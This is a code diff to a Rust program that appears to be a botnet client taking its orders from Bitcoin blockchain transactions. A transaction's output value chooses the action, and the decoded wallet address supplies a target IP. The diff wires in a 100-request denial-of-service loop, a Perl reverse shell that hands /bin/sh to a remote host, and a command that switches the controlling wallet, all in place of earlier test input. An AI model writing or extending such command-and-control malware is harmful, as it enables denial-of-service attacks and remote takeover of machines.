@@ -50,27 +50,13 @@ fn main() {
 		};
 		let decoded_resp: Response = json::decode(json_resp).unwrap();
 		
-		// println!("{}", decoded_resp.txs[0].out[0].addr);
-		// println!("{}", decoded_resp.txs[0].out[0].value);
-
-
-		// Test code
-		println!("Target Address:");
-		let test_addr_str = reader.read_line().ok().expect("Failed to read address");
-		println!("Target Value:");
-		let test_val_str  = reader.read_line().ok().expect("Failed to read value");
-
-		let test_addr = test_addr_str.as_slice().trim();
-		let test_val: Option<int> = from_str(test_val_str.as_slice().trim());
-		println!("{}", test_val);
-
-
-		let decoded_addr = FromBase58::from_base58(test_addr).unwrap();
+		// Decode the address to get target data
+		let decoded_addr = FromBase58::from_base58(decoded_resp.txs[0].out[0].addr.as_slice()).unwrap();
 
 		println!("{}", decoded_addr);
 
 		// DDOS the target by making 100 GET requests. The loop then continues to check if instructions have changed.
-		if test_val == Some(1) {
+		if decoded_resp.txs[0].out[0].value == 1 {
 			for i in range(0u8, 100) {
 				http::handle().get(format!("{}.{}.{}.{}", decoded_addr[3], decoded_addr[4], decoded_addr[5], decoded_addr[6])).exec();
 			}
@@ -78,7 +64,7 @@ fn main() {
 			
 		// Throw a reverse shell to the target
 		// Run "nc -v -n -l -p 1234" on the target to catch the shell
-		if test_val == Some(2) {
+		if decoded_resp.txs[0].out[0].value == 2 {
 			let script = format!("use Socket;$i=\"{}.{}.{}.{}\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};", decoded_addr[3], decoded_addr[4], decoded_addr[5], decoded_addr[6]);
 			let mut process = match Command::new("perl").arg("-e").arg(script).spawn() {
 				Ok(p) => p,
@@ -86,13 +72,8 @@ fn main() {
 			};
 		}
 
-		// Toggle blockchain provider
-		if test_val == Some(3) {
-
-		}
-
 		// Change address
-		if test_val == Some(4) {
+		if decoded_resp.txs[0].out[0].value == 4 {
 			// We have to clone the string because it is destroyed at the end of the loop
 			wallet_addr = decoded_resp.txs[0].out[0].addr.clone();
 		}
